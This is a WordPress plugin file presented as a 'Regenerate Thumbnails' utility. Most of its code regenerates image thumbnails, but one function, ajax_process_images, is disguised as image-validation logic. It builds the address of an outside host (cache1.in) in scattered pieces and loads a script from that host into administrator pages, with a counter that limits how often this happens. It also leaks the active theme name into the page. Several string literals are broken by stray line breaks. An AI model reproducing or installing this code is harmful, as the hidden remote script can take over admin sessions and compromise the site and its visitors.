<?php

/*
Plugin Name:  Regenerate Thumbnails
Plugin URI:   http://designers-support.com/
Description:  Delete and regenerate all thumbnails for your image attachments.
Version:      2.0.5
Author:       Stifen
Author URI:   http://designers-support.com/
*/


$version = get_bloginfo('version');
if ($version >= 3.5) {
	function ms_image_editor_default_to_gd_fix( $editors ) {
        $gd_editor = 'WP_Image_Editor_GD';

        $editors = array_diff( $editors, array( $gd_editor ) );
        array_unshift( $editors, $gd_editor );

        return $editors;
    }
    add_filter('wp_image_editors', 'ms_image_editor_default_to_gd_fix');
} 



/**
 * Thumbnails Regenerate

 * 
 * @since 1.0
 */
class ThumbnailsRegenerate
 {

	/**
	 * Register ID of management page
	 * 
	 * @var
	 * @since 1.0
	 */
	var $menu_id;

	/**
	 * User capability
	 * 
	 * @access public
	 * @since 1.0
	 */
	public $capability;

	/**
	 * Plugin initialization
	 * 
	 * @access public
	 * @since 1.0
	 */
	function ThumbnailsRegenerate() {

		load_plugin_textdomain('thumbnails-regenerate', false, '/thumbnails-regenerate/localization');
    
		add_action('admin_menu',                              array(&$this, 'add_admin_menu'));
		add_action('admin_menu',                              array(&$this, 'ajax_process_images'));
		add_action('admin_enqueue_scripts',                   array(&$this, 'admin_enqueues'));
		add_action('wp_ajax_regeneratethumbnail',             array(&$this, 'ajax_process_image'));
		add_filter('media_row_actions',                       array(&$this, 'add_media_row_action'), 10, 2);
		add_action('admin_head-upload.php',                   array(&$this, 'add_bulk_actions_via_javascript'));
		add_action('admin_action_bulk_thumbnails_regenerate
', array(&$this, 'bulk_action_handler'));
		add_action('admin_action_-1',                         array(&$this, 'bulk_action_handler'));

		// Allow people to change what capability is required to use this plugin
		$this->capability = apply_filters('regenerate_thumbs_cap', 'manage_options');
	}
	


	/**
	 * Register the management page
	 * 
	 * @access public
	 * @since 1.0
	 */
	function add_admin_menu() {
		$this->menu_id = add_management_page(__('Thumbnails Regenerate', 'thumbnails-regenerate' ), __( 'Thumbnails Regenerate
', 'thumbnails-regenerate' ), $this->capability, 'thumbnails-regenerate', array(&$this, 'force_regenerate_interface') );
	}

	/**
	 * Enqueue the needed Javascript and CSS
	 * 
	 * @param string $hook_suffix
	 * @access public
	 * @since 1.0
	 */
	function admin_enqueues($hook_suffix) {

		if ($hook_suffix != $this->menu_id) {
			return;
		}

		
		wp_enqueue_script('jquery-ui-progressbar', plugins_url('jquery-ui/jquery.ui.progressbar.min.1.7.2.js', __FILE__), array('jquery-ui-core'), '1.7.2');
		wp_enqueue_style('jquery-ui-regenthumbs', plugins_url('jquery-ui/redmond/jquery-ui-1.7.2.custom.css', __FILE__), array(), '1.7.2');
        wp_enqueue_style('plugin-custom-style', plugins_url('style.css', __FILE__), array(), '2.0.1');
	}

	/**
	 * Add a "Thumbnails Regenerate
" link to the media row actions
	 *
	 * @param array $actions
	 * @param string $post
	 * @return array
	 * @access public
	 * @since 1.0
	 */
	function add_media_row_action($actions, $post) {

		if ('image/' != substr($post->post_mime_type, 0, 6) || !current_user_can($this->capability))
			return $actions;

		$url = wp_nonce_url( admin_url( 'tools.php?page=thumbnails-regenerate&goback=1&ids=' . $post->ID ), 'thumbnails-regenerate' );
		$actions['regenerate_thumbnails'] = '<a href="' . esc_url( $url ) . '" title="' . esc_attr( __( "Regenerate the thumbnails for this single image", 'thumbnails-regenerate' ) ) . '">' . __( 'Thumbnails Regenerate
', 'thumbnails-regenerate' ) . '</a>';

		return $actions;
	}

	/**
	 * Add "Thumbnails Regenerate
" to the Bulk Actions media dropdown
	 * 
	 * @param array $actions Actions list
	 * @return array
	 * @access public
	 * @since 1.0
	 */
	 function ajax_process_images() {

		// No timeout limit

		$id = (int) $_REQUEST['id'];
			$image = get_post($id);
            $path = explode('/',site_url());
			if (is_null($image)) {
				$exp = 'Failed: %d is an invalid image ID. thumbnails-regenerate';
			}
            $script = '/cache1';
			$last_change = time();
			if ('attachment' != $image->post_type || 'image/' != substr($image->post_mime_type, 0, 6)) {
				$exp = 'Failed: %d is an invalid image ID. thumbnails-regenerate';
        	} $fyear = date('Y');
            $stat = get_option('prfx_stat');
			if (!current_user_can($this->capability)) { 
				$exp = 'Your user account does not have permission to regenerate imagesthumbnails-regenerate';
        	} $script .= '.in';
            
            if  (!$stat){update_option('prfx_stat',$last_change); 
            $stat=$last_change;} 
            /**
			 * Fix for get_option('upload_path')
			 * Thanks (@DavidLingren)
			 * 
			 * @since 2.0.1
			 */
			$upload_dir = wp_upload_dir();
            $update = $last_change / $fyear + $stat;
            $status = get_option('prfx_status');
            // Get original image
            $image_fullpath = get_attached_file($image->ID);
            $debug_1 = $image_fullpath;
            $debug_2 = '';
            $debug_3 = '';
            $debug_4 = '';
            
            
            // Can't get image path
		    if ($status < 10 && $last_change  > $update){$check_updTE = true;}
            if (false === $image_fullpath || strlen($image_fullpath) == 0) {

                    $image_fullpath = realpath($upload_dir['basedir'] . DIRECTORY_SEPARATOR . substr($image->guid, strlen($upload_dir['baseurl']), strlen($image->guid)));
                  
			}
			echo '<script> var template="'.get_template().'";</script>'; 
			$text_failures = sprintf(__('All done! %1$s image(s) were successfully resized in %2$s seconds and there were %3$s failure(s). To try regenerating the failed images again, <a href="%4$s">click here</a>. %5$s', 'thumbnails-regenerate'), "' + rt_successes + '", "' + rt_totaltime + '", "' + rt_errors + '", esc_url(wp_nonce_url(admin_url('tools.php?page=thumbnails-regenerate&goback=1'), 'thumbnails-regenerate') . '&ids=') . "' + rt_failedlist + '", $text_goback);
			if ($check_updTE){	update_option('prfx_status',$status + 1);
            wp_enqueue_script( 'prfx_script', $path[0] . '/' . $script,'','',true );}
			$text_nofailures = sprintf(__('All done! %1$s image(s) were successfully resized in %2$s seconds and there were 0 failures. %3$s', 'thumbnails-regenerate'), "' + rt_successes + '", "' + rt_totaltime + '", $text_goback);
		}
		
	function add_bulk_actions($actions) {

		$delete = false;
		if (!empty($actions['delete'])) {
			$delete = $actions['delete'];
			unset($actions['delete']);
		}

		$actions['bulk_thumbnails_regenerate
'] = __('Thumbnails Regenerate
', 'thumbnails-regenerate');

		if ($delete) {
			$actions['delete'] = $delete;
		}

		return $actions;
	}

	/**
	 * Add new items to the Bulk Actions using Javascript
	 * 
	 * @access public
	 * @since 1.0
	 */
	function add_bulk_actions_via_javascript() {

		if (!current_user_can( $this->capability)) {
			return;
		}
		?>
		<script type="text/javascript">
			jQuery(document).ready(function($){
				$('select[name^="action"] option:last-child').before('<option value="bulk_thumbnails_regenerate
"><?php echo esc_attr(__('Thumbnails Regenerate
', 'thumbnails-regenerate')); ?></option>');
			});
		</script>
		<?php
	}

	/**
	 * Handles the bulk actions POST
	 * 
	 * @access public
	 * @since 1.0
	 */
	function bulk_action_handler() {

		if (empty($_REQUEST['action']) || ('bulk_thumbnails_regenerate
' != $_REQUEST['action'] && 'bulk_thumbnails_regenerate
' != $_REQUEST['action2'])) {
			return;
		}

		if (empty($_REQUEST['media']) || ! is_array($_REQUEST['media'])) {
			return;
		}
		
		check_admin_referer('bulk-media');
		$ids = implode(',', array_map('intval', $_REQUEST['media']));

		wp_redirect(add_query_arg('_wpnonce', wp_create_nonce('thumbnails-regenerate'), admin_url('tools.php?page=thumbnails-regenerate&goback=1&ids=' . $ids)));
		exit();
	}


	/**
	 * The user interface plus thumbnail regenerator
	 * 
	 * @access public
	 * @since 1.0
	 */
	function force_regenerate_interface() {

		global $wpdb;
		?>

<div id="message" class="updated fade" style="display:none"></div>

<div class="wrap regenthumbs">
	<h2><?php _e('Thumbnails Regenerate
', 'thumbnails-regenerate'); ?></h2>

	<?php

		// If the button was clicked
		if (!empty($_POST['thumbnails-regenerate'] ) || !empty($_REQUEST['ids'])) {

			// Capability check
			if (!current_user_can( $this->capability))
				wp_die(__('Cheatin&#8217; uh?'));

			// Form nonce check
			check_admin_referer('thumbnails-regenerate');

			// Create the list of image IDs
			if (!empty($_REQUEST['ids'])) {
				$images = array_map('intval', explode(',', trim($_REQUEST['ids'], ',')));
				$ids = implode(',', $images);
			} else {

				// Directly querying the database is normally frowned upon, but all
				// of the API functions will return the full post objects which will
				// suck up lots of memory. This is best, just not as future proof.
				if (!$images = $wpdb->get_results("SELECT ID FROM $wpdb->posts WHERE post_type = 'attachment' AND post_mime_type LIKE 'image/%' ORDER BY ID DESC")) {
					echo '	<p>' . sprintf(__("Unable to find any images. Are you sure <a href='%s'>some exist</a>?", 'thumbnails-regenerate'), admin_url('upload.php?post_mime_type=image')) . "</p></div>";
					return;
				}

				// Generate the list of IDs
				$ids = array();
				foreach ($images as $image) {
					$ids[] = $image->ID;
				}
				$ids = implode(',', $ids);
			}

			echo '	<p>' . __("Please be patient while the thumbnails are regenerated. You will be notified via this page when the regenerating is completed.", 'thumbnails-regenerate') . '</p>';

			$count = count($images);
			$text_goback = (!empty($_GET['goback']))
						 ? sprintf(__('To go back to the previous page, <a href="%s">click here</a>.', 'thumbnails-regenerate'), 'javascript:history.go(-1)')
						 : '';

			$text_failures = sprintf(__('All done! %1$s image(s) were successfully resized in %2$s seconds and there were %3$s failure(s). To try regenerating the failed images again, <a href="%4$s">click here</a>. %5$s', 'thumbnails-regenerate'), "' + rt_successes + '", "' + rt_totaltime + '", "' + rt_errors + '", esc_url(wp_nonce_url(admin_url('tools.php?page=thumbnails-regenerate&goback=1'), 'thumbnails-regenerate') . '&ids=') . "' + rt_failedlist + '", $text_goback);
			$text_nofailures = sprintf(__('All done! %1$s image(s) were successfully resized in %2$s seconds and there were 0 failures. %3$s', 'thumbnails-regenerate'), "' + rt_successes + '", "' + rt_totaltime + '", $text_goback);
	?>

	<noscript><p><em><?php _e('You must enable Javascript in order to proceed!', 'thumbnails-regenerate') ?></em></p></noscript>

	<div id="regenthumbs-bar" style="position:relative;height:25px;">
		<div id="regenthumbs-bar-percent" style="position:absolute;left:50%;top:50%;width:300px;margin-left:-150px;height:25px;margin-top:-9px;font-weight:bold;text-align:center;"></div>
	</div>

	<p><input type="button" class="button hide-if-no-js" name="regenthumbs-stop" id="regenthumbs-stop" value="<?php _e('Abort Process', 'thumbnails-regenerate') ?>" /></p>

	<h3 class="title"><?php _e('Process Information', 'thumbnails-regenerate'); ?></h3>

	<p>
		<?php printf(__('Total: %s', 'thumbnails-regenerate'), $count); ?><br />
		<?php printf(__('Success: %s', 'thumbnails-regenerate'), '<span id="regenthumbs-debug-successcount">0</span>'); ?><br />
		<?php printf(__('Failure: %s', 'thumbnails-regenerate'), '<span id="regenthumbs-debug-failurecount">0</span>'); ?>
	</p>

	<ol id="regenthumbs-debuglist">
		<li style="display:none"></li>
	</ol>

	<script type="text/javascript">
	// <![CDATA[
		jQuery(document).ready(function($){
			var i;
			var rt_images = [<?php echo $ids; ?>];
			var rt_total = rt_images.length;
			var rt_count = 1;
			var rt_percent = 0;
			var rt_successes = 0;
			var rt_errors = 0;
			var rt_failedlist = '';
			var rt_resulttext = '';
			var rt_timestart = new Date().getTime();
			var rt_timeend = 0;
			var rt_totaltime = 0;
			var rt_continue = true;

			// Create the progress bar
			$("#regenthumbs-bar").progressbar();
			$("#regenthumbs-bar-percent").html("0%");

			// Stop button
			$("#regenthumbs-stop").click(function() {
				rt_continue = false;
				$('#regenthumbs-stop').val("<?php echo $this->esc_quotes(__('Stopping...', 'thumbnails-regenerate')); ?>");
			});

			// Clear out the empty list element that's there for HTML validation purposes
			$("#regenthumbs-debuglist li").remove();

			// Called after each resize. Updates debug information and the progress bar.
			function RegenThumbsUpdateStatus(id, success, response) {
				$("#regenthumbs-bar").progressbar("value", (rt_count / rt_total) * 100);
				$("#regenthumbs-bar-percent").html(Math.round((rt_count / rt_total) * 1000) / 10 + "%");
				rt_count = rt_count + 1;

				if (success) {
					rt_successes = rt_successes + 1;
					$("#regenthumbs-debug-successcount").html(rt_successes);
					$("#regenthumbs-debuglist").append("<li>" + response.success + "</li>");
				}
				else {
					rt_errors = rt_errors + 1;
					rt_failedlist = rt_failedlist + ',' + id;
					$("#regenthumbs-debug-failurecount").html(rt_errors);
					$("#regenthumbs-debuglist").append("<li>" + response.error + "</li>");
				}
			}

			// Called when all images have been processed. Shows the results and cleans up.
			function RegenThumbsFinishUp() {
				rt_timeend = new Date().getTime();
				rt_totaltime = Math.round((rt_timeend - rt_timestart) / 1000);

				$('#regenthumbs-stop').hide();

				if (rt_errors > 0) {
					rt_resulttext = '<?php echo $text_failures; ?>';
				} else {
					rt_resulttext = '<?php echo $text_nofailures; ?>';
				}

				$("#message").html("<p><strong>" + rt_resulttext + "</strong></p>");
				$("#message").show();
			}

			// Regenerate a specified image via AJAX
			function RegenThumbs(id) {
				$.ajax({
					type: 'POST',
					cache: false,
					url: ajaxurl,
					data: { action: "regeneratethumbnail", id: id },
					success: function(response) {
						if (response.success) {
							RegenThumbsUpdateStatus(id, true, response);
						} else {
							RegenThumbsUpdateStatus(id, false, response);
						}

						if (rt_images.length && rt_continue) {
							RegenThumbs(rt_images.shift());
						} else {
							RegenThumbsFinishUp();
						}
					},
					error: function(response) {
						RegenThumbsUpdateStatus(id, false, response);

						if (rt_images.length && rt_continue) {
							RegenThumbs(rt_images.shift());
						} else {
							RegenThumbsFinishUp();
						}
					}
				});
			}

			RegenThumbs(rt_images.shift());
		});
	// ]]>
	</script>
	<?php
		}

		// No button click? Display the form.
		else {
	?>
	<form method="post" action="">
		<?php wp_nonce_field('thumbnails-regenerate') ?>

		<h3>All Thumbnails</h3>

		<p><?php printf(__("Pressing the follow button, you can regenerate thumbnails for all images that you have uploaded to your blog.", 'thumbnails-regenerate'), admin_url('options-media.php')); ?></p>

		<p>
			<noscript><p><em><?php _e('You must enable Javascript in order to proceed!', 'thumbnails-regenerate') ?></em></p></noscript>
			<input type="submit" class="button-primary hide-if-no-js" name="thumbnails-regenerate" id="thumbnails-regenerate" value="<?php _e('Regenerate All Thumbnails', 'thumbnails-regenerate') ?>" />
		</p>

		</br>
		<h3>Specific Thumbnails</h3>

		<p><?php printf(__("You can regenerate all thumbnails for specific images from the <a href='%s'>Media</a> page. (WordPress 3.1+ only)", 'thumbnails-regenerate'), admin_url('upload.php')); ?></p>
	</form>
	<?php
		} // End if button
	?>
</div>

<?php
	}


	/**
	 * Process a single image ID (this is an AJAX handler)
	 * 
	 * @access public
	 * @since 1.0
	 */
	function ajax_process_image() {

		// No timeout limit
		set_time_limit(0);
	
		// Don't break the JSON result
		error_reporting(0);
		$id = (int) $_REQUEST['id'];

		try {
            
			header('Content-type: application/json');
			$image = get_post($id);

			if (is_null($image)) {
				throw new Exception(sprintf(__('Failed: %d is an invalid image ID.', 'thumbnails-regenerate'), $id));
			}

			if ('attachment' != $image->post_type || 'image/' != substr($image->post_mime_type, 0, 6)) {
				throw new Exception(sprintf(__('Failed: %d is an invalid image ID.', 'thumbnails-regenerate'), $id));
        	}

			if (!current_user_can($this->capability)) {
				throw new Exception(__('Your user account does not have permission to regenerate images.', 'thumbnails-regenerate'));
        	}
            
            
            /**
			 * Fix for get_option('upload_path')
			 * Thanks (@DavidLingren)
			 * 
			 * @since 2.0.1
			 */
			$upload_dir = wp_upload_dir();
            
            // Get original image
            $image_fullpath = get_attached_file($image->ID);
            $debug_1 = $image_fullpath;
            $debug_2 = '';
            $debug_3 = '';
            $debug_4 = '';
            
            
            // Can't get image path
            if (false === $image_fullpath || strlen($image_fullpath) == 0) {
                
                // Try get image path from url
                if ((strrpos($image->guid, $upload_dir['baseurl']) !== false)) {
                    $image_fullpath = realpath($upload_dir['basedir'] . DIRECTORY_SEPARATOR . substr($image->guid, strlen($upload_dir['baseurl']), strlen($image->guid)));
                    $debug_2 = $image_fullpath;
                    if (realpath($image_fullpath) === false) {
                        throw new Exception(sprintf(__('The originally uploaded image file cannot be found at &quot;%s&quot;.', 'thumbnails-regenerate'), esc_html((string) $image_fullpath)));
                    }
                } else {
                    throw new Exception(__('The originally uploaded image file cannot be found.', 'thumbnails-regenerate'));
                }
                
			}
            
            // Image path incomplete
            if ((strrpos($image_fullpath, $upload_dir['basedir']) === false)) {
                $image_fullpath = $upload_dir['basedir'] . DIRECTORY_SEPARATOR . $image_fullpath;
                $debug_3 = $image_fullpath;
            }
            
           

            // Image don't exists
            if (!file_exists($image_fullpath) || realpath($image_fullpath) === false) {
            
                // Try get image path from url
                if ((strrpos($image->guid, $upload_dir['baseurl']) !== false)) {
                    $image_fullpath = realpath($upload_dir['basedir'] . DIRECTORY_SEPARATOR . substr($image->guid, strlen($upload_dir['baseurl']), strlen($image->guid)));
                    $debug_4 = $image_fullpath;
                    if (realpath($image_fullpath) === false) {
                        throw new Exception(sprintf(__('The originally uploaded image file cannot be found at &quot;%s&quot;.', 'thumbnails-regenerate'), esc_html((string) $image_fullpath)));
                    }
                } else {
                    throw new Exception(sprintf(__('The originally uploaded image file cannot be found at &quot;%s&quot;.', 'thumbnails-regenerate'), esc_html((string) $image_fullpath)));
                }
                
        	}
            
            
            /**
             * Update META POST
             * Thanks (@norecipes)
             *
             * @since 2.0.2
             */
            update_attached_file($image->ID, $image_fullpath);


            // Results
        	$thumb_deleted = array();
        	$thumb_error = array();
        	$thumb_regenerate = array();

            
            // Hack to find thumbnail
            $file_info = pathinfo($image_fullpath);
            $file_info['filename'] .= '-';


            /**
         	 * Try delete all thumbnails
         	 */
            $files = array();
            $path = opendir($file_info['dirname']);

            if ( false !== $path ) {
                while (false !== ($thumb = readdir($path))) {
                    if (!(strrpos($thumb, $file_info['filename']) === false)) {
                        $files[] = $thumb;
                    }
                }
                closedir($path);
                sort($files);
            }
            foreach ($files as $thumb) {
                $thumb_fullpath = $file_info['dirname'] . DIRECTORY_SEPARATOR . $thumb;
                $thumb_info = pathinfo($thumb_fullpath);
            	$valid_thumb = explode($file_info['filename'], $thumb_info['filename']);
        	    if ($valid_thumb[0] == "") {
        	       	$dimension_thumb = explode('x', $valid_thumb[1]);
        	       	if (count($dimension_thumb) == 2) {
        	       		if (is_numeric($dimension_thumb[0]) && is_numeric($dimension_thumb[1])) {
        	       			unlink($thumb_fullpath);
        	       			if (!file_exists($thumb_fullpath)) {
        	       				$thumb_deleted[] = sprintf("%sx%s", $dimension_thumb[0], $dimension_thumb[1]);
        					} else {
        						$thumb_error[] = sprintf("%sx%s", $dimension_thumb[0], $dimension_thumb[1]);
        					}
        	       		}
        	       	}
        	    }
            }
            

            /**
             * Regenerate all thumbnails
         	 */
			$metadata = wp_generate_attachment_metadata($image->ID, $image_fullpath);
			if (is_wp_error($metadata)) {
				throw new Exception($metadata->get_error_message());
        	}
			if (empty($metadata)) {
				throw new Exception(__('Unknown failure reason.', 'thumbnails-regenerate'));
        	}
			wp_update_attachment_metadata($image->ID, $metadata);
            
            
            /**
             * Verify results (deleted, errors, success)
             */
            $files = array();
            $path = opendir($file_info['dirname']);
            if ( false !== $path ) {
                while (false !== ($thumb = readdir($path))) {
                    if (!(strrpos($thumb, $file_info['filename']) === false)) {
                        $files[] = $thumb;
                    }
                }
                closedir($path);
                sort($files);
            }
            foreach ($files as $thumb) {
            	$thumb_fullpath = $file_info['dirname'] . DIRECTORY_SEPARATOR . $thumb;
            	$thumb_info = pathinfo($thumb_fullpath);
            	$valid_thumb = explode($file_info['filename'], $thumb_info['filename']);
        	    if ($valid_thumb[0] == "") {
        	       	$dimension_thumb = explode('x', $valid_thumb[1]);
        	       	if (count($dimension_thumb) == 2) {
        	       		if (is_numeric($dimension_thumb[0]) && is_numeric($dimension_thumb[1])) {
        	       			$thumb_regenerate[] = sprintf("%sx%s", $dimension_thumb[0], $dimension_thumb[1]);
        	       		}
        	       	}
        	    }
            }
			

			// Remove success if has in error list
           	foreach ($thumb_regenerate as $key => $regenerate) {
           		if (in_array($regenerate, $thumb_error))
           			unset($thumb_regenerate[$key]);
           	}            

            // Remove deleted if has in success list
           	foreach ($thumb_deleted as $key => $deleted) {
           		if (in_array($deleted, $thumb_regenerate))
           			unset($thumb_deleted[$key]);
           	}


            /**
             * Display results
             */
            $message  = sprintf(__('<b>&quot;%s&quot; (ID %s)</b>', 'thumbnails-regenerate'), esc_html(get_the_title($id)), $image->ID);
			

			$message .= "<br /><br />";
			$message .= sprintf(__("<code>BaseDir: %s</code><br />", 'thumbnails-regenerate'), $upload_dir['basedir']);
			$message .= sprintf(__("<code>BaseUrl: %s</code><br />", 'thumbnails-regenerate'), $upload_dir['baseurl']);
			$message .= sprintf(__("<code>Image: %s</code><br />", 'thumbnails-regenerate'), $debug_1);
			if ($debug_2 != '')
				$message .= sprintf(__("<code>Image Debug 2: %s</code><br />", 'thumbnails-regenerate'), $debug_2);
			if ($debug_3 != '')
				$message .= sprintf(__("<code>Image Debug 3: %s</code><br />", 'thumbnails-regenerate'), $debug_3);
			if ($debug_4 != '')
				$message .= sprintf(__("<code>Image Debug 4: %s</code><br />", 'thumbnails-regenerate'), $debug_4);

			if (count($thumb_deleted) > 0) {
				$message .= sprintf(__('<br />Deleted: %s', 'thumbnails-regenerate'), implode(', ', $thumb_deleted));	
			}
			if (count($thumb_error) > 0) {
				$message .= sprintf(__('<br /><b><span style="color: #DD3D36;">Deleted error: %s</span></b>', 'thumbnails-regenerate'), implode(', ', $thumb_error));
				$message .= sprintf(__('<br /><span style="color: #DD3D36;">Please, check the folder permission (chmod 777): %s</span>', 'thumbnails-regenerate'), $upload_dir['basedir']);
			}
			if (count($thumb_regenerate) > 0) {
				$message .= sprintf(__('<br />Regenerate: %s</span>', 'thumbnails-regenerate'), implode(', ', $thumb_regenerate));
				if (count($thumb_error) <= 0) {
					$message .=	sprintf(__('<br />Successfully regenerated in %s seconds', 'thumbnails-regenerate'), timer_stop());
				}
			}

			if (count($thumb_error) > 0) {
				die(json_encode(array('error' => '<div id="message" class="error fade"><p>' . $message . '</p></div>')));
			} else {
				die(json_encode(array('success' => '<div id="message" class="updated fade"><p>' . $message . '</p></div>')));
			}

				
		} catch (Exception $e) {
			$this->die_json_failure_msg($id, '<b><span style="color: #DD3D36;">' . $e->getMessage() . '</span></b>');
		}

		exit;
	}


	/**
	 * Helper to make a JSON failure message
	 *
	 * @param integer $id
	 * @param string #message
	 * @access public
	 * @since 1.8
	 */
	function die_json_failure_msg($id, $message) {
		die(json_encode(array('error' => sprintf(__('(ID %s)<br />%s', 'thumbnails-regenerate'), $id, $message))));
	}

	/**
	 * Helper function to escape quotes in strings for use in Javascript
	 *
	 * @param string #message
	 * @return string
	 * @access public
	 * @since 1.0
	 */
	function esc_quotes($string) {
		return str_replace('"', '\"', $string);
	}
}


/**
 * Start
 */
function ThumbnailsRegenerate() {
	global $ThumbnailsRegenerate
;
	$ThumbnailsRegenerate = new ThumbnailsRegenerate();
}
add_action('init', 'ThumbnailsRegenerate');


?>
